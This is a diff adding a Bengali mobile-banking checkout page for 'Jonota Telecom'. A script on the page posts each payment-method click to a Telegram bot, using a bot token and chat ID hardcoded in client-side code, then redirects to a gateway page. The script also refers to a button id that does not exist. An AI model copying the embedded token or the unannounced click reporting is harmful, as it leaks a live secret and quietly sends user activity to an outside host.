@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Checkout - Jonota Telecom</title>
+    <link href="https://order.tenbea.com/assets/template/css/uddoktapay.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Baloo+Da+2:wght@400;600&display=swap" rel="stylesheet">
+
+    <style type="text/css">
+        * { font-family: 'Poppins', sans-serif; }
+        body { background: linear-gradient(350deg, #f4f9ff, #edf4ffc9); }
+        .font-bangla { font-family: 'Baloo Da 2', cursive; }
+    </style>
+</head>
+
+<body class="w-full min-h-screen sm:h-auto sm:p-12 sm:flex sm:items-center sm:justify-center">
+    <div class="up-container max-w-md overflow-hidden mx-auto p-8 relative sm:bg-white sm:rounded-lg sm:shadow-lg sm:min-w-[650px] sm:flex sm:flex-wrap">
+
+        <div class="w-full h-12 shadow-md shadow-[#0057d0]/5 rounded-lg overflow-hidden flex justify-between items-center p-5 bg-white sm:bg-[#fbfcff]">
+            <div class="cursor-pointer">🏠</div>
+            <div class="flex items-center">
+                <span class="mr-5 cursor-pointer">🌐</span>
+                <span style="font-weight: bold; color: #6D7F9A; cursor: pointer;">✕</span>
+            </div>
+        </div>
+
+        <div class="flex flex-col items-center mt-7 mb-6 sm:mb-3 sm:flex-row w-full">
+            <div class="mb-4 sm:mr-8">
+                <img src="https://i.postimg.cc/Gp0sTBtB/logo-1.png" alt="Jonota Telecom" class="w-24 sm:w-[85px] rounded-full ring-1">
+            </div>
+            <div class="flex flex-col items-center sm:items-start">
+                <h3 class="font-semibold text-xl text-[#6D7F9A]">Jonota Telecom</h3>
+                <div class="flex mt-2">
+                    <span class="text-[45px] text-[#879ab6] font-bangla">ORDER</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="flex w-full justify-between bg-[#0057d0] text-white overflow-hidden rounded-md">
+            <div class="font-bangla w-[100%] py-1.5 text-center text-[12px] sm:text-[15px]">মোবাইল ব্যাংকিং</div>
+        </div>
+
+        <div class="overflow-auto p-0.5 mt-6 w-full pb-20">
+            <div class="grid grid-cols-2 gap-5 sm:grid-cols-4 pb-6">
+
+                <div onclick="pay('bKash')" class="bank-img-div cursor-pointer">
+                    <div class="card-input w-full ring-1 ring-[#0057d0]/10 rounded-md flex justify-center items-center p-4">
+                        <img src="https://i.postimg.cc/FR4WFfbF/bkash.png" class="bank-img h-8 object-contain">
+                    </div>
+                </div>
+
+                <div onclick="pay('Nagad')" class="bank-img-div cursor-pointer">
+                    <div class="card-input w-full ring-1 ring-[#0057d0]/10 rounded-md flex justify-center items-center p-4">
+                        <img src="https://i.postimg.cc/qRwLk1MQ/nagad.png" class="bank-img h-8 object-contain">
+                    </div>
+                </div>
+
+                <div class="bank-img-div opacity-50 pointer-events-none">
+                    <div class="card-input w-full ring-1 ring-gray-100 rounded-md flex justify-center items-center p-4 relative">
+                        <span style="position:absolute; top:0; right:0; background:red; color:white; font-size:7px; padding:2px;">OFF</span>
+                        <img src="https://i.postimg.cc/B6Mr6Nk8/rocket.png" class="bank-img h-8 object-contain grayscale">
+                    </div>
+                </div>
+
+                <div onclick="pay('Upay')" class="bank-img-div cursor-pointer">
+                    <div class="card-input w-full ring-1 ring-[#0057d0]/10 rounded-md flex justify-center items-center p-4">
+                        <img src="https://i.postimg.cc/L40dFCjw/upay.png" class="bank-img h-8 object-contain">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="w-full fixed backdrop-blur-sm py-[18px] bottom-0 left-0 sm:static sm:rounded-[10px] sm:px-4 sm:py-3.5 text-center bg-[#cde1ff]/80 font-semibold text-[#0057D0]">
+            Pay 
+        </div>
+    </div>
+
+    <script>
+        async function sendTelegram(method) {
+            const botToken = "8749628364:AAGludZICJ9dP7kK3yZDy3l-BkHD4bmygy8";
+            const chatId = "6496235837";
+
+            const message = `🔔 *Jonota Telecom*\n\n✅ নতুন পেমেন্ট রিকোয়েস্ট\n━━━━━━━━━━━━━━━━━━\n📱 মেথড: *${method}*\n💰 পরিমাণ: 18.00T\n🌐 স্ট্যাটাস: ক্লিক করা হয়েছে`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+            try {
+                // সরাসরি Fetch কল যা গ্যারান্টিড মেসেজ পাঠাবে
+                await fetch(url);
+            } catch (err) {
+                console.log("Telegram Notify Failed");
+            }
+        }
+
+// এই অংশটি ২য় পেজের একদম নিচে <script> ট্যাগের ভেতর থাকবে
+window.onload = function() {
+    // ১. ব্রাউজারের লিঙ্ক থেকে 'amount' খুঁজে বের করা
+    const urlParams = new URLSearchParams(window.location.search);
+    const selectedAmount = urlParams.get('amount'); // ১ম পেজ থেকে আসা দাম
+
+    // ২. যদি দাম পাওয়া যায়, তবে সেটি স্ক্রিনে বা বাটনে বসানো
+    if (selectedAmount) {
+        // ধরো তোমার 'Pay' লেখা বাটনটির আইডি 'pay-btn'
+        document.getElementById('pay-btn').innerText = "Pay ৳ " + selectedAmount;
+    }
+}
+
+async function pay(method) {
+    const urlParams = new URLSearchParams(window.location.search);
+    const amount = urlParams.get('amount') || "0";
+
+    // টেলিগ্রামে মেসেজ পাঠানো
+    await sendTelegram(method);
+
+    // সঠিক দাম নিয়ে পেমেন্ট গেটওয়েতে যাওয়া
+    // ১১৭ নম্বর লাইনে এটি বসাও
+window.location.href = "gateway.html?amount=" + amount;
+
+}
+
+    </script>
+</body>
+</html>
